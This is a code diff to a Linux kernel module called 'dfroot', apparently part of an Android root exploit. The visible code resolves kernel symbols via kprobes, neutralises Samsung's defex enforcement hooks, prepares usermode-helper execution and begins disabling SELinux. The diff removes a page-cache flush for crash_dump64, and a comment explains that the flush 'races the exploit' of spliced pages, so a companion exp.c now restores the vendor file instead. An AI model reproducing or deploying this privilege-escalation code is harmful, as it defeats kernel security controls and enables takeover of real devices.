@@ -3,7 +3,6 @@
 #include <linux/kmod.h>
 #include <linux/kprobes.h>
 #include <linux/module.h>
-#include <linux/namei.h>
 #include <linux/ptrace.h>
 #include <linux/cred.h>
 #include <linux/seccomp.h>
@@ -16,9 +15,6 @@ typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 typedef void *(*umh_setup_t)(const char *path, char **argv, char **envp, gfp_t gfp,
                              void *init, void *cleanup, void *data);
 typedef int (*umh_exec_t)(void *info, int wait);
-typedef int  (*kern_path_t)(const char *, unsigned int, struct path *);
-typedef int  (*invalidate_t)(struct address_space *);
-typedef void (*path_put_t)(const struct path *);
 
 static struct kprobe defex_enforce_kp;
 static struct kprobe defex_umh_kp;
@@ -82,10 +78,6 @@ static int null_pre_handler(struct kprobe *p, struct pt_regs *regs)
 static int __nocfi __init dfroot_init(void)
 {
     kallsyms_lookup_name_t get_addr;
-    kern_path_t  kern_path_fn;
-    invalidate_t invalidate_fn;
-    path_put_t   path_put_fn;
-    struct path  p;
     umh_setup_t umh_setup;
     umh_exec_t  umh_exec;
     bool *selinux_state;
@@ -112,22 +104,11 @@ static int __nocfi __init dfroot_init(void)
     get_addr = (kallsyms_lookup_name_t)kln_kp.addr;
     unregister_kprobe(&kln_kp);
 
-    // Invalidate page_cache for crash_dump64
-    // NOTE: this can cause issues if a process is currently executing
-    //   crash_dump64. We may want to revert to manual restore patching
-    kern_path_fn  = (kern_path_t) get_addr("kern_path");
-    invalidate_fn = (invalidate_t)get_addr("invalidate_inode_pages2");
-    path_put_fn   = (path_put_t)  get_addr("path_put");
-    if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
-        pr_err("dfroot: cache drop symbols missing\n");
-    } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
-                            LOOKUP_FOLLOW, &p)) {
-        pr_err("dfroot: kern_path failed for crash_dump64\n");
-    } else {
-        invalidate_fn(p.dentry->d_inode->i_mapping);
-        path_put_fn(&p);
-        pr_info("dfroot: cleared page cache for crash_dump64\n");
-    }
+    // NOTE: the page-cache drop for crash_dump64 used to live here, but it
+    //   races the exploit: once it drops the spliced pages the crash_dump
+    //   bridge is gone and exp.c can no longer restore the vendor file.
+    //   exp.c cleanup() now writes the original bytes back instead, which is
+    //   deterministic and needs no kernel support.
 
     // Disable SELinux
     selinux_state = (bool *)get_addr("selinux_state");
